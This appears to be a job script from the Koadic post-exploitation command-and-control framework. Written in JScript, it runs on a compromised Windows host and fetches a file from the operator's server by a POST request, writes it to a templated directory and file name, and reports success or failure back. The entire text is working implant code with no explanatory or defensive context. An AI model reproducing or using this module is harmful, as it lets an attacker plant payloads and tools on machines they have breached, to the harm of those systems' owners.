try
{
    var headers = {};
    headers["X-UploadFileJob"] = "true";
    var path = Koadic.file.getPath( "~DIRECTORY~\\~FILE~");

    Koadic.http.downloadEx("POST", Koadic.work.make_url(), headers, path);
    Koadic.work.report("Completed");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
